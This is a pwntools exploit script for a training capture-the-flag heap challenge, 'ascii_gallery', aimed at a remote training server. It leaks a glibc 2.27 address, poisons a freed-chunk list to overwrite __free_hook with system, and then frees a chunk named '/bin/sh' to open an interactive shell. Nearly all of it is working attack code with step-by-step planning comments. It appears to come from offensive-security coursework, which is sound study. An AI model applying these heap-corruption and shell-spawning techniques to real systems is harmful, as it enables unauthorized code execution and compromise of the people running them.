from pwn import *

# This program allows you to create, delete, edit and see up to 10 (one is already loaded at the start) ascii pictures. It has various flaws (I highlighted them in the source code), and we can exploit some of them to leak and overwrite stuff

CHALL_PATH = './ascii_gallery_patch'
LIBC = ELF('../../env/libc-2.27.so', checksec=False)
COMMANDS = '''
b main
b new_art
b list_and_delete
b list_and_edit
c
'''

def new_art(c, name, size, art):
    c.recvuntil(b'> ')
    c.sendline(b'0')
    c.recvuntil(b'name> ')
    c.sendline(name)
    c.recvuntil(b'art sz> ')
    c.sendline(str(size).encode('utf-8'))
    c.send(art)

def list_and_print(c, n):
    c.recvuntil(b'> ')
    c.sendline(b'1')
    c.recvuntil(b'art#> ')
    c.sendline(str(n).encode('utf-8'))
    c.recvline()                        # *** [name] ***
    return c.recvline(keepends=False)

def list_and_delete(c, n):
    c.recvuntil(b'> ')
    c.sendline(b'2')
    c.recvuntil(b'art#> ')
    c.sendline(str(n).encode('utf-8'))

def list_and_edit(c, n, name, size, art):
    c.recvuntil(b'> ')
    c.sendline(b'3')
    c.recvuntil(b'art#> ')
    c.sendline(str(n).encode('utf-8'))

    try:
        c.recvuntil(b'name> ', timeout=1)
        c.sendline(name)
        c.recvuntil(b'art sz> ')
        c.sendline(str(size).encode('utf-8'))
        c.send(art)
    except:
        print(f'Could\'t modify picture {n}')
        exit(0)

if args.REMOTE:
    c = remote('ascii-gallery.training.offensivedefensive.it', 8080, ssl=True)
elif args.GDB:
    c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    print(c.recvline(keepends=False).decode('utf-8'))
else:
    c = process(CHALL_PATH)

# Plan:
# 1. create a new art with a big artsz (largebin)
# 2. delete the new art to make the big chunk go to the unsorted bin
# 3. create a new art with the same artsz of the previous (with no content inside)
# 4. print the new art to leak libc address
# 5. create a new art with a small artsz (fastbin)
# 6. delete the new art
# 7. modify the art created at point 3. to overflow on the name of the previously deleted one and overwrite it with the address of __malloc_hook or __free_hook
# 8. see if it's possible to use a gadget, if so, allocate a new art and in the name save the gadget addr. If it's not possible to use a gadget, use the usual trick of system(/bin/sh)

# Leaking libc address
new_art(c, b'art1', 0x500, b'\x00')        # picture 1
list_and_delete(c, 1)
new_art(c, b'art1', 0x500, b'\x00')        # picture 1 again to leak libc address
leak = int.from_bytes(list_and_print(c, 1)[:6], 'little')
LIBC.address = leak - 0x3ebC00
print(f'Libc base: {hex(LIBC.address)}')

# Arbitrary chunk allocation
new_art(c, b'art2', 0x20, b'hellothere')    # picture 2
list_and_delete(c, 2)
free_hook = LIBC.sym['__free_hook']
list_and_edit(c, 1, b'art1', 0x600, b'a'*0x540 + p64(free_hook))
new_art(c, b'something', 0x20, b'other things')     # picture 2, emptying fastbins list

# Cannot overwrite __malloc_hook because gadgets don't work in this case => __free_hook

system = LIBC.sym['system']
new_art(c, p64(system), 0x20, b'hellothere')        # picture 3, overwriting __free_hook with system address

# We cannot delete one picture because it would imply printing the names of the previous ones, which gives segmentation fault, so we have to allocate new pictures until it reaches the maximum number (10) and so frees the chunks allocated for the first picture out of the limit

for i in range(4, 10):
    new_art(c, b'hustling you', 0x40, b'Most beautifullest art ever made by human kind')

new_art(c, b'/bin/sh\x00', 0x20, b'kamehamehaaaaa')
c.interactive()

# Libc one_gadgets:
# 0x4f3ce       nope
# 0x4f3d5       nope
# 0x4f432       nope
# 0x10a41c      nope